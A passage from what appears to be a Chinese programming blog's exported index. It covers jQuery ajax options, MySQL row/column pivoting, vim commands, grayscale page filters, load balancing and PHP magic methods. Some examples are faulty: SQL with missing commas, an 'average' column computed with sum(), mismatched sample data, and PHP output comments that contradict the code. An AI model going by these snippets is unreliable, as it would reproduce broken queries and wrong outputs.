jQuery.param 方法。 timeout 类型：Number 设置请求超时时间（毫秒）。此设置将覆盖全局设置。 type 类型：String 默认值: GET。请求方式 (“POST” 或 “GET”)， 默认为 “GET”。注意：其它 HTTP 请求方法，如 PUT 和 DELETE 也可以使用，但仅部分浏览器支持。 url 类型：String 默认值: 当前页地址。发送请求的地址。 username 类型：String 用于响应 HTTP 访问认证请求的用户名。 xhr 类型：Function 需要返回一个 XMLHttpRequest 对象。默认在 IE 下是 ActiveXObject 而其他情况下是 XMLHttpRequest 。用于重写或者提供一个增强的 XMLHttpRequest 对象。这个参数在 jQuery 1.3 以前不可用。]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL中竖表和横表之间的相互转换]]></title>
    <url>%2Farticles%2FMYSQL%E4%B8%AD%E7%AB%96%E8%A1%A8%E5%92%8C%E6%A8%AA%E8%A1%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[横表转为竖表表tb的结构为 字段名 类型 允许为空 是否主键 id int(11) no yes 姓名 int(11) yes no 语文 decimal(3,1) yes no 数学 decimal(3,1) yes no 英语 decimal(3,1) yes no 表中的数据为 id 姓名 语文 数学 英语 1 小张 89 80 89 2 小丽 69 78 98 现在要求查询到如下结果 name subject score 小丽 语文 69 小丽 数学 78 小丽 英语 79 小张 语文 89 小张 数学 80 小张 英语 89 使用的SQL查询语句应该如下： 1234 select 姓名 as name, '语文' as subject, 语文 as score from tbunion select 姓名 as name, '数学' as subject, 数学 as score from tbunion select 姓名 as name, '英语' as subject, 英语 as score from tborder by name 或者 12345678select * from( select 姓名 as name, '语文' as subject `语文` as score from tb union select 姓名 as name, '数学' as subject `数学` as score from tb union select 姓名 as name, '英语' as subject `英语` as score from tb) as tb2order by name 竖表转为横表tb2表的结构如下 字段名 类型 允许为空 是否主键 id int(11) no yes name varchar(255) yes no subject varchar(255) yes no score decimal(3,1) yes no tb2的数据如下 id name subject score 2 小丽 英语 98 3 小丽 数学 78 6 小张 语文 89 5 小张 数学 80 4 小张 英语 89 1 小丽 语文 69 现在想把tb2的数据变为 姓名 语文 英语 数学 小丽 68 98 78 小张 89 89 80 查询的SQL语句如下： 123456select name as '姓名', max(case subject when '语文' then score else 0 end) 语文, max(case subject when '英语' then score else 0 end) 英语, max(case subject when '数学' then score else 0 end) 数学from tb2group by name 现在要求得到如下查询结果 姓名 语文 数学 英语 总分 平均分 小丽 69 78 98 245 81.6666667 小张 89 80 89 258 86 SQL查询语句应该为： 12345678select `name` as 姓名,max(case `subject` when '语文' then `score` else 0 end) as 语文,max(case `subject` when '数学' then `score` else 0 end) as 数学,max(case `subject` when '英语' then `score` else 0 end) as 英语,sum(`score`) as 总分,sum(`score`) as 平均分from `tb2`group by `name`]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[退出vim]]></title>
    <url>%2Farticles%2F%E9%80%80%E5%87%BAvim%2F</url>
    <content type="text"><![CDATA[命令 简单说明 :w 保存编辑后的文件内容，但不退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中。 :w! 强制写文件，即强制覆盖原有文件。如果原有文件的访问权限不允许写入文件，例如，原有的文件为只读文件，则可使用这个命令强制写入。但是，这种命令用法仅当用户是文件的属主时才适用，而超级用户则不受此限制。 :wq 保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。另外一种替代的方法是用ZZ命令。 :wq! 强制保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据强制写到启动vim时指定的文件中，然后退出vim编辑器。 ZZ 使用ZZ命令时，如果文件已经做过编辑处理，则把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。否则只是退出vim而已。注意，ZZ命令前面无需加冒号“：”，也无需按Enter键。 :q 在未做任何编辑处理而准备退出vim时，可以使用此命令。如果已做过编辑处理，则vim不允许用户使用“:q”命令退出，同时还会输出下列警告信息： No write since last change (:quit!overrides) :q! 强制退出vim编辑器，放弃编辑处理的结果。如果确实不需要保存修改后的文件内容，可输入“:q!”命令，强行退出vim编辑器。 :w filename 把编辑处理后的结果写到指定的文件中保存 :w! filename 把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有的文件。 :wq! filename 把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有文件，并退出vim编辑器。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何让网站变灰]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E8%AE%A9%E7%BD%91%E7%AB%99%E5%8F%98%E7%81%B0%2F</url>
    <content type="text"><![CDATA[今天给大家分享一个web前端的小技巧哦，就是如何在公共哀悼纪念日，让网站变为黑白颜色。其实很多方法有css实现，和js实现的。网上都有的，js有js的特点，css有css优点，当然缺点也是存在。 1.超兼容IE，火狐firefox，谷歌的css滤镜 123456789101112131415161718html &#123; filter: grayscale(100%);//IE浏览器 -webkit-filter: grayscale(100%);//谷歌浏览器 -moz-filter: grayscale(100%);//火狐 -ms-filter: grayscale(100%); -o-filter: grayscale(100%); filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); -webkit-filter: grayscale(1);//谷歌浏览器&#125; 优点：基本兼容所有浏览器。 缺点：就是ie6可能嗝屁了，ie页面电脑资源消耗肯能大一点。 2.js代码实现grayscale.js代码实现 引用文件，就不要讲了吧，好吧还是说一下： 1&lt;script src="http://james.padolsey.com/demos/grayscale/grayscale.js"&gt;&lt;script&gt; 使用： 12345&lt;script type="text/javascript"&gt; grayscale(document.getElementById("thisImage"));&lt;script _ue_org_tagname="script"&gt;&lt;/script&gt; 优点：兼容所有浏览器,还能针对不同dom来实现 缺点：电脑资源消耗肯能大一点，尤其老ie，老电脑浏览器一度卡死。 3.SVG滤镜实现 新建一个空白文件，比如说：gray.svg. 拷贝进去如下的XML代码： 12345&lt;svg version="1.1"xmlns="http://www.w3.org/2000/svg"&gt; &lt;filter id="grayscale"&gt; &lt;feColorMatrix type="matrix" values="0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"/&gt; &lt;filter&gt;&lt;svg&gt; CSS调用代码： 1filter: url(gray.svg#grayscale); 对应ie还要多写一下： 1filter: gray; 优点：兼容所有浏览器 缺点：修改很麻烦。]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一分钟了解负载均衡的一切]]></title>
    <url>%2Farticles%2F%E4%B8%80%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E4%B8%80%E5%88%87%2F</url>
    <content type="text"><![CDATA[什么是负载均衡负载均衡(Load Balance)是分布式系统架构设计中必须考虑的因素之一，它通常是指，将请求/数据【均匀】分摊到多个操作单元上执行，负载均衡的关键在于【均匀】。 常见的负载均衡方案 常见互联网分布式架构如上，分为客户端层、反向代理nginx层、站点层、服务层、数据层。可以看到，每一个下游都有多个上游调用，只需要做到，每一个上游都均匀访问每一个下游，就能实现“将请求/数据【均匀】分摊到多个操作单元上执行”。 【客户端层-&gt;反向代理层】的负载均衡 【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的：DNS-server对于一个域名配置了多个解析ip，每次DNS解析请求来访问DNS-server，会轮询返回这些ip，保证每个ip的解析概率是相同的。这些ip就是nginx的外网ip，以做到每台nginx的请求分配也是均衡的。 【反向代理层-&gt;站点层】的负载均衡 【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的。通过修改nginx.conf，可以实现多种负载均衡策略： 1)请求轮询：和DNS轮询类似，请求依次路由到各个web-server 2)最少连接路由：哪个web-server的连接少，路由到哪个web-server 3)ip哈希：按照访问用户的ip哈希值来路由web-server，只要用户的ip分布是均匀的，请求理论上也是均匀的，ip哈希均衡方法可以做到，同一个用户的请求固定落到同一台web-server上，此策略适合有状态服务，例如session(58沈剑备注：可以这么做，但强烈不建议这么做，站点层无状态是分布式架构设计的基本原则之一，session最好放到数据层存储) 【站点层-&gt;服务层】的负载均衡 【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的。 上游连接池会建立与下游服务多个连接，每次请求会“随机”选取连接来访问下游服务。 【数据层】的负载均衡 在数据量很大的情况下，由于数据层(db，cache)涉及数据的水平切分，所以数据层的负载均衡更为复杂一些，它分为“数据的均衡”，与“请求的均衡”。 数据的均衡是指：水平切分后的每个服务(db，cache)，数据量是差不多的。 请求的均衡是指：水平切分后的每个服务(db，cache)，请求量是差不多的。 业内常见的水平切分方式有这么几种： 1、按照range水平切分 每一个数据服务，存储一定范围的数据，上图为例： user0服务，存储uid范围1-1kw user1服务，存储uid范围1kw-2kw 这个方案的好处是： (1)规则简单，service只需判断一下uid范围就能路由到对应的存储服务 (2)数据均衡性较好 (3)比较容易扩展，可以随时加一个uid[2kw,3kw]的数据服务 不足是： (1)请求的负载不一定均衡，一般来说，新注册的用户会比老用户更活跃，大range的服务请求压力会更大 2、按照id哈希水平切分 每一个数据服务，存储某个key值hash后的部分数据，上图为例： user0服务，存储偶数uid数据 user1服务，存储奇数uid数据 这个方案的好处是： (1)规则简单，service只需对uid进行hash能路由到对应的存储服务 (2)数据均衡性较好 (3)请求均匀性较好 不足是： (1)不容易扩展，扩展一个数据服务，hash方法改变时候，可能需要进行数据迁移 总结负载均衡(Load Balance)是分布式系统架构设计中必须考虑的因素之一，它通常是指，将请求/数据【均匀】分摊到多个操作单元上执行，负载均衡的关键在于【均匀】。 (1)【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的 (2)【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的 (3)【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的 (4)【数据层】的负载均衡，要考虑“数据的均衡”与“请求的均衡”两个点，常见的方式有“按照范围水平切分”与“hash水平切分”]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP 中 16 个魔术方法详解]]></title>
    <url>%2Farticles%2FPHP%20%E4%B8%AD%2016%20%E4%B8%AA%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言PHP中把以两个下划线__开头的方法称为魔术方法，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括： __construct(): 类的构造函数 __destruct(): 类的析构函数 __call(): 在对象中调用一个不可访问方法时调用 __callStatic(): 用静态方式中调用一个不可访问方法时调用 __get(): 获得一个类的成员变量时调用 __set(): 设置一个类的成员变量时调用 __isset(): 当对不可访问属性调用isset()或empty()时调用 __unset(): 当对不可访问属性调用unset()时被调用。 __sleep(): 执行serialize()时，先会调用这个函数 __wakeup(): 执行unserialize()时，先会调用这个函数 __toString(): 类被当成字符串时的回应方法 __invoke(): 调用函数的方式调用一个对象时的回应方法 __set_state(): 调用var_export()导出类时，此静态方法会被调用。 __clone(): 当对象复制完成时调用 __autoload(): 尝试加载未定义的类 __debugInfo(): 打印所需调试信息范例 下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。 __constructphp中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。 作用: 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。 声明格式: function __constrct([参数列表]){ 方法体 //通常用来对成员属性进行初始化赋值} 注意的事项: 在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。 构造方法名称是以两个下画线开始的__construct() 下面是它的例子： 123456789101112131415161718192021222324252627class Person &#123; public $name; public $age; public $sex; /*** 显示声明一个构造方法且带参数 ***/ public function __construct($name = "", $sex = "男", $age = 22) &#123; $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; &#125; /*** say 方法 ***/ public function say() &#123; echo "我叫：" . $this-&gt;name . "，性别：" . $this-&gt;sex . "，年龄：" . $this-&gt;age; &#125;&#125;# 创建对象 $Person1 且不带任参数$Person1 = new Person();echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27# 创建对象$Person2且带参数“小明”$Person2 = new Person("小明");echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27# 创建对象$Person3且带三个参数$Person3 = new Person("李四","男",25);echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25 通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。 _destruct()析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。 析构方法是PHP5才引进的新内容。 析造方法的声明格式与构造方法 __construct() 比较类似，也是以两个下划线开始的方法 __destruct() ，这种析构方法名称也是固定的。 声明格式: function __destruct(){ //方法体} 注意：析构函数不能带有任何参数。 作用: 一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。 举例演示，如下： 12345678910111213141516171819202122232425class Person &#123; public $name; public $age; public $sex; public function __construct($name = "", $sex = "男", $age = 22) &#123; $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; &#125; /** * say 说话方法 */ public function say() &#123; echo "我叫：" . $this-&gt;name . "，性别：" . $this-&gt;sex . "，年龄：" . $this-&gt;age; &#125; /** * 声明一个析构方法 */ public function __destruct() &#123; echo "我觉得我还可以再抢救一下，我的名字叫" . $this-&gt;name; &#125;&#125;$Person = new Person("小明");unset($Person); //销毁上面创建的对象$Person上面的程序运行时输出：我觉得我还可以再抢救一下，我的名字叫小明三 __call()__call()在对象中调用一个不可访问方法时调用。 该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数。 格式： function __call(string $function_name, array $arguments){ // 方法体} 作用： 为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。 该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。 请参考如下代码： 123456789101112131415161718192021class Person &#123; function say() &#123; echo "Hello, world!&lt;br&gt;"; &#125; /** * 声明此方法用来处理调用对象中不存在的方法 */ function __call($funName, $arguments) &#123; echo "你所调用的函数：" . $funName . "(参数："; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo ")不存在！&lt;br&gt;\n"; // 结束换行 &#125;&#125;$Person = new Person();$Person-&gt;run("teacher"); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person-&gt;eat("小明", "苹果");$Person-&gt;say();运行结果：你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! __callStatic()__callStatic()，用静态方式中调用一个不可访问方法时调用，此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。 请看下面代码： 123456789101112131415161718192021class Person &#123; function say() &#123; echo "Hello, world!&lt;br&gt;"; &#125; /** * 声明此方法用来处理调用对象中不存在的方法 */ public static function __callStatic($funName, $arguments) &#123; echo "你所调用的静态方法：" . $funName . "(参数："; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo ")不存在！&lt;br&gt;\n"; // 结束换行 &#125;&#125;$Person = new Person();$Person::run("teacher"); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person::eat("小明", "苹果");$Person-&gt;say();运行结果如下：你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! __get()__get()，获得一个类的成员变量时调用。 在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现 不能访问某个私有属性 的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。 魔术方法__get()的作用 在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。 我们通过下面的 __get() 的实例来更进一步的连接它吧： 123456789101112131415161718192021222324252627class Person &#123; private $name; private $age; function __construct($name = "", $age = 1) &#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; /** * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理 * @param $propertyName * * @return int */ public function __get($propertyName) &#123; if ($propertyName == "age") &#123; if ($this-&gt;age &gt; 30) &#123; return $this-&gt;age - 10; &#125; else &#123; return $this-&gt;$propertyName; &#125; &#125; else &#123; return $this-&gt;$propertyName; &#125; &#125;&#125;$Person = new Person("小明", 60); // 通过Person类实例化的对象，并通过构造方法为属性赋初值echo "姓名：" . $Person-&gt;name . "&lt;br&gt;"; // 直接访问私有属性name，自动调用了__get()方法可以间接获取echo "年龄：" . $Person-&gt;age . "&lt;br&gt;"; // 自动调用了__get()方法，根据对象本身的情况会返回不同的值运行结果：姓名：小明年龄：50六、 __set()，设置一个类的成员变量时调用 __set()__set( $property, $value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。 请看下面的演示代码： 12345678910111213141516171819202122232425262728293031class Person &#123; private $name; private $age; public function __construct($name = "", $age = 25) &#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; /** * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值 * @param $property * @param $value */ public function __set($property, $value) &#123; if ($property == "age") &#123; if ($value &gt; 150 || $value &lt; 0) &#123; return; &#125; &#125; $this-&gt;$property = $value; &#125; /** * 在类中声明说话的方法，将所有的私有属性说出 */ public function say() &#123; echo "我叫" . $this-&gt;name . "，今年" . $this-&gt;age . "岁了"; &#125;&#125;$Person = new Person("小明", 25); //注意，初始值将被下面所改变//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数$Person-&gt;name = "小红"; //赋值成功。如果没有__set()，则出错。//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数$Person-&gt;age = 16; // 赋值成功$Person-&gt;age = 160; //160是一个非法值，赋值失效$Person-&gt;say(); // 输出：我叫小红，今年16岁了运行结果：我叫小红，今年16岁了 __isset()__isset()，当对不可访问属性调用isset()或empty()时调用。在看这个方法之前我们看一下isset()函数的应用，isset()是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。 那么如果在一个对象外面使用isset()这个函数去测定对象里面的成员是否被设定可不可以用它呢？ 分两种情况： 如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性 如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。 那么我们就不可以在对象的外部使用isset()函数来测定私有成员属性是否被设定了呢？ 当然是可以的，但不是一成不变。你只要在类里面加上一个isset()方法就可以了，当在类外部使用isset()函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的isset()方法了帮我们完成这样的操作。 isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，isset() 会被调用。 请看下面代码演示： 12345678910111213141516171819class Person &#123; public $sex; private $name; private $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; /** * @param $content * * @return bool */ public function __isset($content) &#123; echo "当在类外部使用isset()函数测定私有成员&#123;$content&#125;时，自动调用&lt;br&gt;"; echo isset($this-&gt;$content); &#125;&#125;$person = new Person("小明", 25); // 初始赋值echo isset($person-&gt;sex),"&lt;br&gt;"; // 1echo isset($person-&gt;name),"&lt;br&gt;";// 当在类外部使用isset()函数测定私有成员name时，自动调用echo isset($person-&gt;age),"&lt;br&gt;"; // 当在类外部使用isset()函数测定私有成员age时，自动调用 __unset()看这个方法之前呢，我们也先来看一下 unset() 函数，unset()这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。 那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？ 这里自然也是分两种情况： 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 如果对象的成员属性是私有的，这个函数就没有权限去删除。 虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上unset()这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了unset()这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。 请看如下代码： 12345678910111213141516171819class Person &#123; public $sex; private $name; private $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; /** * @param $content * * @return bool */ public function __unset($content) &#123; echo "当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;"; echo isset($this-&gt;$content); &#125;&#125;$person = new Person("小明", 25); // 初始赋值unset($person-&gt;sex);// 成功删除unset($person-&gt;name);// 当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;unset($person-&gt;age);// 当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt; __sleep() 执行serialize()时，先会调用这个函数. serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意： __sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用： __sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 具体请参考如下代码： 123456789101112131415161718192021class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; /** * @return array */ public function __sleep() &#123; echo "当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"; $this-&gt;name = base64_encode($this-&gt;name); return array( 'name', 'age' ); // 这里必须返回一个数值，里边的元素表示返回的属性名称 &#125;&#125;$person = new Person('小明'); // 初始赋值echo serialize($person);// 当在类外部使用serialize()时会调用这里的__sleep()方法O:6:"Person":2:&#123;s:4:"name";s:8:"5bCP5piO";s:3:"age";i:25;&#125; __wakeup()执行unserialize()时，先会调用这个函数。如果说 __sleep() 是白的，那么 __wakeup() 就是黑的了。 那么为什么呢？ 因为与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 作用： __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 还是看代码： 12345678910111213141516171819202122232425262728class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; /** * @return array */ public function __sleep() &#123; echo "当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"; $this-&gt;name = base64_encode($this-&gt;name); return array( 'name', 'age' ); // 这里必须返回一个数值，里边的元素表示返回的属性名称 &#125; /** * __wakeup */ public function __wakeup() &#123; echo "当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;"; $this-&gt;name = 2; $this-&gt;sex = '男'; // 这里不需要返回数组 &#125;&#125;$person = new Person('小明'); // 初始赋值var_dump(serialize($person));// 当在类外部使用serialize()时会调用这里的__sleep()方法string(58) "O:6:"Person":2:&#123;s:4:"name";s:8:"5bCP5piO";s:3:"age";i:25;&#125;" var_dump(unserialize(serialize($person)));// 当在类外部使用serialize()时会调用这里的__sleep()方法当在类外部使用unserialize()时会调用这里的__wakeup()方法object(Person)#2 (3) &#123; ["sex"]=&gt; string(3) "男" ["name"]=&gt; int(2) ["age"]=&gt; int(25) &#125; __toString()类被当成字符串时的回应方法 作用： __toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。 注意： 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 警告： 不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 代码： 123456789101112131415class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __toString() &#123; return 'go go go'; &#125;&#125;$person = new Person('小明'); // 初始赋值echo $person;// go go go 那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下： 代码： 12345678910111213141516class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125;&#125;$person = new Person('小明'); // 初始赋值echo $person;输出：Catchable fatal error: Object of class Person could not be converted to string in D:\www\test.php on line 12 很明显，页面报了一个致命错误，这是语法所不允许的。 __invoke()作用： 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 注意： 本特性只在 PHP 5.3.0 及以上版本有效。 直接上代码： 123456789101112131415class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __invoke() &#123; echo '这可是一个对象哦'; &#125;&#125;$person = new Person('小明'); // 初始赋值$person(); // 这可是一个对象哦 当然，如果你执意要将对象当函数方法使用，那么会得到下面结果： Fatal error: Function name must be a string in D:\www\test.php on line 12 __set_state()作用： 自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。 参数： 本方法的唯一参数是一个数组，其中包含按 array(‘property’ =&gt; value, …) 格式排列的类属性。 下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何： 上代码： 12345678910111213141516class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125;&#125;$person = new Person('小明'); // 初始赋值var_export($person);结果：Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小明', 'age' =&gt; 25, )) 很明显，将对象中的属性都打印出来了 加了 __set_state() 之后： 继续上代码： 12345678910111213141516171819202122class Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public static function __set_state($an_array) &#123; $a = new Person(); $a-&gt;name = $an_array['name']; return $a; &#125;&#125;$person = new Person('小明'); // 初始赋值$person-&gt;name = '小红';var_export($person);结果：Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小红', 'age' =&gt; 25, )) __clone()在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。 作用： 对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。 语法： 1$copy_of_object = clone $object; 注意： 当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。 当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。 看代码： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Person &#123; public $sex; public $name; public $age; public function __construct($name = "", $age = 25, $sex = '男') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __clone() &#123; echo __METHOD__ . "你正在克隆对象&lt;br&gt;"; &#125;&#125;$person = new Person('小明'); // 初始赋值$person2 = clone $person;var_dump('persion1:');var_dump($person);echo '&lt;br&gt;';var_dump('persion2:');var_dump($person2);结果：Person::__clone你正在克隆对象string(9) "persion1:" object(Person)#1 (3) &#123; ["sex"]=&gt; string(3) "男" ["name"]=&gt; string(6) "小明" ["age"]=&gt; int(25) &#125; string(9) "persion2:" object(Person)#2 (3) &#123; ["sex"]=&gt; string(3) "男" ["name"]=&gt; string(6) "小明" ["age"]=&gt; int(25) &#125; 克隆成功。 __autoload()作用： 你可以通过定义这个函数来启用类的自动加载。 在魔术函数 __autoload() 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。 但是有了 __autoload() 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。 还是通过例子来看看吧： 先看看以往的方式： 123456789101112131415&lt;?php/** * 文件non_autoload.php */ require_once('project/class/A.php'); require_once('project/class/B.php'); require_once('project/class/C.php'); if (条件A) &#123; $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 &#125; else if (条件B) &#123; $a = newA(); $b = new B(); // … 业务逻辑&#125; 